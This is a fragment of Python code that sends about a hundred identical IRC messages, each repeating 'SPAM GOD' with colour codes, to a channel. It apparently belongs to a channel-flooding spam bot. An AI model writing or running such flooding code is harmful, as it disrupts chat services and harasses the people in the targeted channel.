                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n')
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n')
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n')
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n')
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
